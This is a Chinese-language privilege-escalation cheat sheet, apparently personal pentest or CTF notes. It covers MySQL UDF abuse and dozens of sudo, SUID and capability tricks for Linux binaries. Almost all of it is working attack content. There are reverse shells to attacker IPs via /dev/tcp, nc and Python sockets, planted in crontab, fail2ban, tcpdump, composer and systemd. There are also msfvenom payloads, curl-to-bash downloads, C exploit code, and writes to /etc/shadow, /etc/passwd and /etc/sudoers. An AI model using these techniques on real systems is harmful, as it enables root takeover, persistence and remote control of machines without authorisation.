
## MySQL UDF 提权
UDF > User Defined Function ，用户自定义函数

**先决条件  ：** 
- 对于 MySQL 的 account 要有 create ， delete ， insert 权限，最好是 root 用户。
- MySQL 系统变量: **secure_file_priv** 为**空**  ， ' ' 不是 NULL ， NULL 是禁止一切操作；或者指定了我们提权要用到的路径也可以。

Check  secure_file_priv :
```mysql
show variables like '%secure_file_priv%';
show variables like '%Plugin%';
```
查看 Value 是否为空，或者为 `/usr/lib/mysql/plugin` 这个目录。

#### 准备 UDF 链接库
下载利用，这边以 `MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)| linux/local/1518.c` 为例。
**编译文件**
```bash
gcc -g -c 1518.c -fPIC
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
chmod +x 1518.so
```

**查看数据库版本**
```sql
show variables like 'version_compile_%' ;
```

#### 加载动态链接库
```
cd /usr/share/metasploit-framework
find . -name '*udf*' -type f 2>/dev/null
```

**通常使用这种方法**
```mysql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/1518.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function do_system returns integer soname 'raptor_udf.so';
select * from mysql.func;
```

```mysql
select do_system('cp /bin/bash /tmp/rootbash ; chmod +xs /tmp/rootbash') ;
```

**base64** 
```
base64 lib_mysqludf_sys_32.so | tr '\n' '@' | sed 's/@//g'
select from_base64('') into dumpfile '/usr/lib/mysql/plugin/udf.so';
```

**Hex 编码**
```
xxd -ps lib_mysqludf_sys_32.so | tr '\n' '@' | sed 's/@//g'
select unhex('') into dumpfile '/usr/lib/mysql/plugin/udf.so' ;
create function sys_eval returns string soname 'udf.so';
```


## 常见提权方式

- **ln -s** 
```bash
ln -s /bin/bash <CMD>	(软连接)
export PATH=.:$PATH
```

- **doas**
```bash
doas config : 
/etc/doas.conf
/usr/local/etc/doas.conf
```
例: `doas /usr/bin/less /var/log/authlog ` ，然后输入 `:!sh`

- **update-motd.d**
```bash
vi 00-header
echo "root:123456" | chpasswd
```

- **sudo -l : (root:root) SETENV : /usr/bin/check_suslog.sh**
```shell
export PATH=.:$PATH
sudo --preserve-env=PATH <PATH>
```

- **vi**
```bash
sudo vi
:!bash

sudo vi -c ':!/bin/sh' /dev/null
```

- **gcc**
```shell
sudo gcc -wrapper /bin/sh,-s .
```
`-s` PATH
`-wrapper` 封装 

- **RWX for /etc/passwd** 
```shell
openssl passwd -1 123456
(-1 use md5)
>>$1$zJ9dLnLI$CQbuuDt/FnQn08xYwFGit/
```

```shell
root:x:0:0:root:/root:/bin/bash
xekoner:$1$zJ9dLnLI$CQbuuDt/FnQn08xYwFGit/:0:0:root:/root:/bin/bash
echo `xekoner:$1$zJ9dLnLI$CQbuuDt/FnQn08xYwFGit/:0:0:root:/root:/bin/bash` >> /etc/shadow
su - xekoner
```

- **RWX for /etc/shadow**
```
mkpasswd -m sha-512 123456
然后修改root的hash
```

- **/etc/crontab**
```bash
bash -c "bash -i >& /dev/tcp/192.168.0.100/2233 0>&1"
```

- **polkit-agent-helper-1**
1)  https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
```
su - secnigma
secnigmaftw

sudo bash
secnigmaftw
```
   2)
```bash
systemd-run -t /bin/bash
```

- **php**
0x01 sudo
```php
sudo php -r "system('/bin/bash');"
```
0x02 suid
```php
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

- **timedatectl**
```bash
sudo timedatectl list-timezones
!/bin/sh
```

- **date**
```bash
sudo date -f /etc/shadow
```

- **find**
```bash
sudo find . -exec /bin/bash -p \;
```

- **nohup**
```bash
sudo nohup /bin/bash -p -c "bash -p <$(tty) >$(tty) 2>$(tty)"
```

- **vim**
```bash
sudo vim 1
ESC + :!/bin/bash
```

- **nano / pico**
```bash
sudo nano 1
^R ^X
reset;sh 1>&0 2>&0
```

- **crontab**
```bash
*/1 * * * * root bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
```

- **SUDO : (ID) NOPASSWD: /bin/bash**
```bash
sudo -u ID /bin/bash
```

- **Serv-U FTP Server Local Privilege Escalation (CVE)  EXP**
```c
#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{       
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    // if execv is successful, we won't reach here
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}
```

- **bash(SUID)**
```bash
bash -p
```

- **ht**
```bash
sudo ht
F3 open file  (root)
/etc/sudoers  (edit)

xxx ALL=(ALL)NOPASSWD: ALL
[User] ALL=(ALL)NOPASSWD: ALL >> /etc/sudoers
```

- **NMAP**
0x01 nmap (sudo)
```shell
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo -u root nmap --script=$TF
```
0x02 nmap (SUID)
```bash
nmap --interactive
```

- **$PATH**
```shell
echo "/bin/bash" > /tmp/ifconfig ; chmod +x /tmp/ifconfig ; export PATH=/tmp.:$PATH
```

- **sudo -l   :   (ALL) /home/qwe**
```bash
vi /home/qwe.sh

#!/bin/sh
/bin/bash
sudo /home/qwe.sh
```


- **(root) tcpdump**
```bash
COMMAND='bash -i >& /dev/tcp/192.168.55.3/2233 0>&1'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z $TF -Z root

-i 指定网卡，如果没有流量经过就不触发 ， 可以改成有流量经过的比如eth0
-z 指定临时文件，我们也可以自己做一个脚本然后写上去 -z ./qwe.sh
```

捕获进出环回接口的流量
```bash
sudo tcpdump -i lo -A | grep "pass"
```


- **怀疑自动任务的 ( python )**
```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.55.3",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> [FILE]
```

- **(sudo -l)env_reset, env_keep+=LD_PRELOAD  +  root NOPASSWD**
priv.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
编译共享库文件
```bash
gcc -fPIC -shared -nostartfiles -o priv.so priv.c
sudo LD_PRELOAD=/home/user/ldpreload/priv.so <sudo可运行的文件>
```

- **在可写入的文件夹内存在 tar 的计划任务**
https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c
创建反向二进制文件下载到靶机，修改权限，建立监听
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.55.3 LPORT=2233 -f elf -o rev.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=rev.elf
```

比如说 `*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *` , 而 /opt/admin 目录我们是可写的
```bash
cd /opt/admin
echo '/bin/chmod 4755 /bin/bash' > shell.sh; chmod +x ./shell.sh
echo "123" > --checkpoint=1
echo "123" > "--checkpoint-action=exec=sh shell.sh"
```

- **SUID 共享库注入提权**
用 strings / strace 分析文件，调用了共享库，则可能存在共享库注入提权
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() { 
	setuid(0); 
	system("/bin/bash -p");
}
```
(注意命名为调用的共享库文件的名字，以及路径)
```
gcc -shared -fPIC -o poc.so poc.c
```
调用 suid 文件

- **相对服务路径劫持提权**
用 strings / strace 分析文件，执行了 service apache2 start  ；使用了相对路径就可能存在路径劫持提权的可能
```c
#include <stdio.h>
#include <stdlib.h>

void main(){
	setgid(0);
	setuid(0);
	system("/bin/bash -p");
}
```
构建成 service，然后添加环境变量，将当前目录放在最前面，执行 suid 文件。实现相对服务路径劫持提权
```
gcc -o service exp1.c
export PATH=.:$PATH
```
调用 suid 文件

-  **SUID + _Bash versions <4.2-048_   提权**
检查 bash 版本 `bash -version`
用 strings / strace 分析文件，执行了 `/usr/sbin/service xxxxx` ，因为 bash 的版本小于4.2，可以自定义函数路径劫持提权
```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
调用 suid 文件

- **SUID + _Bash versions < 4.4_  提权**
检查 bash 版本 `bash -version`
用 strings / strace 分析文件，执行了 `/usr/sbin/service xxxxx` ，因为 bash 的版本小于4.4，可以修改环境变量提权
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
/tmp/rootbash -p 提权

- **NFS no_root_squash 提权**
检查 /etc/exports , 挂载到本地，建立一个 elf 重启 bash 文件带有 xs 权限，复制到挂载中，靶机上执行
```bash
sudo mount -o rw,vers=3 192.168.55.29:/tmp /mnt
sudo msfvenom -p linux/x86/exec -f elf CMD="/bin/bash -p" -o /mnt/shell.elf
sudo chmod +xs /mnt/shell.elf
```
在靶机中执行该目录下的文件，进行提权

- **apt / apt-get**
```bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
```

- **/usr/sbin/apache2**
```bash
sudo apache2 -f /etc/shadow
```
会回显报错文件内容

- **ash**
```bash
sudo ash
```

- **awk**
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

- **base64 / base****
```bash
LFILE=/etc/shadow
sudo base64 "$LFILE" | base64 --decode
```

- **cp**
```bash
mkpasswd -m sha-512 123456  (生成hash)
LFILE=/etc/shadow
TF=$(mktemp)
echo 'hash' > $TF
sudo cp $TF $LFILE
```

- **cpulinit**
```bash
sudo cpulimit -l 100 -f /bin/bash
```

- **curl**
```bash
mkpasswd -m sha-512 123456  (生成hash)
root:HASH:19545:0:99999:7:::  (修改hash)
python -m http.server 80
sudo curl http://192.168.55.3/hash -o /etc/shadow
```

- **dd**
```bash
mkpasswd -m sha-512 123456  (生成hash)
echo 'root:HASH:19545:0:99999:7:::' | sudo dd of=/etc/shadow
```

- **dstat**
```
find / -name "dstat" -type d 2>/dev/null  (查找dstat的插件文件夹)
```
dstat_priv.py  自定义新建一个插件 :
`import os; os.execv("/bin/bash",["bash"])`
```
cp ./dstat_priv.py /usr/share/dstat/
sudo dstat --priv
```

- **ed**
```bash
sudo ed
!/bin/bash
```

- **env**
```bash
sudo env /bin/bash
```

- **exiftool**
ExifTool 12.23 - Arbitrary Code Execution   ([2021-22204](https://nvd.nist.gov/vuln/detail/CVE-2021-22204))
https://www.exploit-db.com/exploits/50911
vim payload: ` (metadata "\c${system('/bin/bash')};") `
```bash
bzz payload payload.bzz
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
sudo exiftool exploit.djvu 
```
0x02
```bash
└─$ cat shell.sh 
#!/bin/bash

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.118.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-----------------------------------------------------------------------------------------------------------
└─$ cat exploit 
(metadata "\c${system ('curl http://192.168.118.11/shell.sh | bash')};")
-----------------------------------------------------------------------------------------------------------
sudo apt install djvulibre-bin
djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
mv exploit.djvu exploit.jpg   (根据利用方式修改后续操作)
file exploit.jpg
```

- **expect**
```bash
sudo expect -c "spawn /bin/bash;interact"
```

- **fail2ban**
```
find / -name "fail2ban*" -type d 2>/dev/null   (查找 fail2ban 的文件夹,通常在 /etc 下)
find /etc -writable -type d 2>/dev/null        (查看 fail2ban/action.d 规则文件夹是否可写)
```
`jail.conf` 规则配置文件，bantime,findtime,maxretry 等
`iptables-multiport.conf` 规则触发配置文件
如果 `iptables-multiport.conf` 文件没有写入权限  (下面的操作是因为对 action.d 这个文件夹拥有写入权限) (更改文件属主)：
```
mv iptables-multiport.conf iptables-multiport.conf.bak
cp iptables-multiport.conf.bak iptables-multiport.conf
chmod 666 iptables-multiport.conf
```
编辑文件中的 `actionban` 参数:
```
actionban = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.55.3 2233 >/tmp/f
```
重启 fail2ban，kali 建立监听 , 登录 ssh 失败超过次数后收到反弹 shell （使用空密码更快）
```bash
sudo /etc/init.d/fail2ban restart
rlwrap -cAr nc -lvvnp 2233
```

- **flock**
```bash
sudo flock -u / /bin/bash
```

- **ftp**
```bash
sudo ftp
ftp> !/bin/bash
```

- **gdb**
```
sudo gdb -nx -ex '!bash' -ex quit
```

- **git**
```bash
sudo git branch --help
!/bin/bash
```

**Gitpython Exploit**
```bash
pip freeze | grep -i git
GitPython==3.1.29
```
https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
```bash
sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'

(this.sh)
echo -e '#!/bin/bash\n\ncp /bin/sh /tmp/rootbash\nchown root:root /tmp/0xdf\nchmod 6777 /tmp/rootbash' > /tmp/this.sh
chmod +x /tmp/this.sh
sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /tmp/this.sh'
```

- **gzip / gunzip**
```bash
sudo gzip -f /etc/shadow -t
```

- **hping3**
```bash
sudo hping3
hping3> /bin/bash
```

- **iftop**
```bash
sudo iftop
!/bin/bash
```

- **java**
```bash
sudo msfvenom -p java/shell_reverse_tcp LHOST=192.168.55.3 LPORT=1337 -f jar -o shell.jar
```
建立监听，传输到靶机后执行
```bash
sudo java -jar shell.jar
```

- **jjs**
sudo , 建立监听后执行
```bash
echo "Java.type('java.lang.Runtime').getRuntime().exec(['/bin/bash','-c','exec 5<>/dev/tcp/192.168.55.3/1337;cat <&5 | while read line; do \$line 2>&5 >&5; done']).waitFor()" | sudo jjs
```

suid
```bash
ssh-keygen -t rsa  (生成秘钥对,上传公钥)  (KALI)

/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs  (进入jjs的交互)

var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("/root/.ssh/authorized_keys");
fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8rCmOsXr958xRJZum+9MSjKFl6l6zMWw59/rqBCVvZyhJLx1iCPMqEa4AujlxDmm07zn9UCN8gHQ7yopl6q/HVYT0ddMNBjeR63Pa/K7T9hpnUha/j6h9NK9fffRFenp/TGd000KfETZMr5BxjfP4dE7JSWUER8cngJ0maumIR/nXprHarWSChQtOlCpe5FLqNKeJR5cA7BLSn0CksEh6syGpol06GFRysYoBearZqa8JFQ9A7nxD1GWdO/c/gfsRcAU+/26JvtvMWBJIApgE4VduVGYweK2kxbdyjUfPcyHIEgP/OLKKPmyySfIbWlAAkaE0cuS5vKq/KfkV2toZ1K/umIgkSjm8vPhUZ4c9DmsTeG5H6pxUI+y5b2EMkcG2w7Xi8wxte1H8vbBhXz/kFyFYZuHdQWCaH/f51R69l6tw1hF0bMrItLFrMEGamvB++IM0dRnfxgAzYrej2yfCxgMrrKzcgMZNN7RLaaDjx9IyBksi1ZwJH8hRC5w+0us= root@xekOner");
fw.close();

ssh root@<IP>  (KALI)
```

- **journalctl**
```bash
sudo journalctl
!/bin/bash
```

- **knife**
```bash
sudo knife exec -E 'exec "/bin/bash"'
```

- **less**
```
sudo less /etc/passwd
!/bin/bash
```

- **man**
```bash
sudo man ls
!/bin/bash
```

- **more** 
```
jackie@RedteamNotes:~$ cat test  | wc -l
122
sudo more test
!/bin/bash
```

- **mount**
```bash
sudo mount -o bind /bin/bash /usr/bin/mount
sudo mount
```

- **mysql**
```bash
sudo mysql -e '\! /bin/bash'
```

- **neofetch**
```bash
TF=$(mktemp)
echo 'exec /bin/sh' > $TF
sudo neofetch --config $TF
```

```bash
echo 'exec /bin/sh' > .config/neofetch/config.conf
XDG_CONFIG_HOME=~/.config sudo neofetch
```

- **nice (修改进程优先级)**
```bash
sudo nice /bin/bash
```

- **node (node.js)**
```bash
sudo node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
```

- **openvpn**
```bash
sudo openvpn --config /etc/shadow   (读取文件报错并且显示第一行)
```

- **passwd**
```bash
sudo passwd root
```

- **perl**
```bash
sudo perl -e 'exec "/bin/bash"'
```

- **pkexec**
sudo
```bash
sudo pkexec /bin/bash
```

suid
```bash
/usr/bin/pkexec
/usr/bin/pkexec --version   (Check Version)
```

- **python3**
```bash
sudo python3 -c "import os;os.system('/bin/bash')"
```

`getcap -r / 2>/dev/null` :  
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```bash
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash -i")'
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash -i")'
```

- **rvim**
```bash
sudo rvim -c ':python import os; os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
```

- **scp**
```bash
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF x y:
```

- **screen / tmux**
**sudo**
```bash
sudo screen
```

**screen-4.5.0 # Local Privilege Escalation**  (SUID Priv)
https://www.exploit-db.com/exploits/41154
```
└─$ cat libhax.c 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
-
└─$ gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c
-
└─$ cat rootshell.c                                                   
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
-
└─$ gcc -o ./rootshell ./rootshell.c -static
-
```
上传编译好的两个文件到靶机中 **tmp 目录**后继续执行
```bash
cd /etc/
umask 000
screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
cat ld.so.preload
screen-4.5.0 -ls
ls -l /tmp/rootshell
/tmp/rootshell
```

- **script**
```bash
sudo script -q /dev/null
```

- **sed**
```bash
sudo sed -n '1e exec bash 1>&0' /etc/hosts
```

- **service**
```bash
sudo service ../../bin/bash
sudo service /////bin/bash
```

- **socat** 
```bash
sudo socat stdin exec:/bin/bash
```

- **ssh**
```bash
sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
```

- **ssh-keygen**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));
void inject() { 
	setuid(0); 
	system("/bin/bash -p");
}
```
创建 lib.c 后编译文件
```bash
gcc -shared -fPIC -o lib.so lib.c
sudo ssh-keygen -D ./lib.so
```

- **strace**
```bash
sudo strace -o /dev/null /bin/bash
```

- **systemctl**
Sudo
```bash
sudo systemctl
!/bin/bash
```
Suid
```bash
echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.14.25 2233' > /home/pepper/rev.sh ; chmod +x /home/pepper/rev.sh
```

```bash
echo -e '[Unit]
Description=shell

[Service]
Type=noeshot
ExecStart=/home/pepper/rev.sh

[Install]
WantedBy=multi-user.target' > /home/pepper/rev.service
```
监听后执行
```
systemctl link /home/pepper/rev.service
systemctl enable --now /home/pepper/rev.service
```

- **tee**
```bash
openssl passwd -1 -salt xekOnerR '123456'
echo 'xekoner:HASH:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
```

- **wall**
```bash
LFILE=/etc/shadow
sudo wall --nobanner "$LFILE"
```

- **watch**
```bash
sudo watch -x bash -c 'reset; exec bash 1>&0 2>&0' 
```

- **wget**
```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```

- **zip**
```bash
sudo /usr/bin/zip foo /etc/hostname -T -TT 'bash #' 
```

- **xxd**
```bash
sudo xxd /etc/shadow | xxd -r
```

- **sysinfo**
suid  
```
运行 ltrace sysinfo
发现调用了popen("fdisk -l", "r")
没有使用绝对路径，存在路径劫持提权
```

```
cd /dev/shm
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.11/7788 0>&1' > fdisk ; chmod +x fdisk
export PATH="/dev/shm:$PATH"
echo $PATH
```

- **pip / pip3**
```bash
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > setup.py
sudo pip install .
```

- **nginx**
```
└─$ cat 2.conf
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1338;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```
将2.conf 上传到靶机后，执行
```bash
sudo /usr/sbin/nginx -c /tmp/1.conf
curl -X PUT localhost:1338/root/.ssh/authorized_keys [或者 xxx.pub] -d 'xxx'
```

- **openssl**
getcap openssl 有=ep 的权限，则可以导致权限提升
```bash
./openssl base64 -in /etc/sudoers | base64 -d > /dev/shm/t 
echo "ldapuser1 ALL=(ALL) ALL" >> /dev/shm/t 
cat /dev/shm/t | base64 | ./openssl enc -d -base64 -out /etc/sudoers
```

- **borg**
pspy64进行抓取，如果抓到密码，路径就可以继续
进目录后可以提取存档
```bash
sudo borg extract --stdout borgbackup::home
```

- **gcore**
一般都是和可以进程一起使用，因为要用到 PID:  找到一个可以进程的 PID 后直接使用命令转储信息
```bash
sudo gcore -o output <pid>
strings output.xxx
```

- **cassandra-web**
创建一个服务器，然后拥有文件读取权限
```bash
sudo cassandra-web -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330
curl --path-as-is localhost:4444/../../../../../../../../../../../../../etc/shadow
```

- **composer**
`(root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita *`
```bash
cd /var/www/html/lavita; echo '{"scripts":{"x":"bash -c \"bash -i >& /dev/tcp/192.168.45.170/4444 0>&1\""}}' > composer.json
cd /var/www/html/lavita; sudo /usr/bin/composer --working-dir\=/var/www/html/lavita run-script x
```

- **7za** *.zip*
```bash
password=`cat /root/secret`
cd /var/www/html/uploads
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log  （例）
在/opt/backups/创建backup.zip,内容是/var/www/html/uploads 中的所有zip文件，backup.zip设置上密码，命令输出到/opt/backups/backup.log 的日志文件:包含执行命令期间生成的任何消息或错误。
```
滥用:  (创建一个文件指向 /root/secret )
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
```bash
cd /var/www/html/uploads
touch @qwe.zip
ln -s /root/secret qwe.zip
cat /opt/backups/backup.log
```

- cat /opt/backups/backup.log
```
WildCardsGoingWild : No more files  
# WildCardsGoingWild就是/root/secret中的密码
```

0x02
通过 strings 查看，一个二进制文件执行了 7za , 并且有通配符：
`/var/www/html`
`/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *`
```bash
cd /var/www/html
touch @xekoner; ln -fs /root/.ssh/id_rsa xekoner
sudo xxxx   (记得加sudo)
```


- 调用 rootkit exploit (Chkrootkit 0.49 - Local Privilege Escalation 33899.txt )
Chkrootkit 0.49 - Local Privilege Escalation        - linux/local/33899.txt
```bash
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.11/2233 0>&1' > /tmp/update
rlwrap -cAr nc -lvvnp 2233
```